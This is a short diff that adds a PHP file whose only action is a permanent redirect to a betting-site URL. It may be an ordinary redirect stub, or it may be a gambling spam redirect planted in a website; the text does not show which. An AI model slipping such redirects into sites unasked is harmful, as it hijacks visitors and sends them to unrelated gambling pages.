@@ -1,0 +1,4 @@
+<?php
+header("Location: https://betwaybet.in/publicenemy", true, 301);
+exit();
+?>
